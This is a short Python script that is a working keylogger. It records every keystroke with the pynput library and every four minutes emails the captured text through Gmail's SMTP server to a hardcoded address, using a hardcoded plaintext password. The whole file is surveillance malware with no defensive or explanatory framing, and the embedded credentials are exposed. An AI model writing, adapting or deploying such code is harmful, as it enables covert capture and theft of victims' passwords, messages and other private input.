#! /usr/bin/env python

import pynput
import threading
import smtplib

log = "hi how ar eyou/ "


def get_letter(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "


def report():
    global log
    send_email("darmal2017@gmail.com", "cheat123", log)
    print(log)
    log = ""
    timer = threading.Timer(240, report)
    timer.start()


def send_email(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

a = pynput.keyboard.Listener(on_press=get_letter)
with a:
    report()
    a.join()



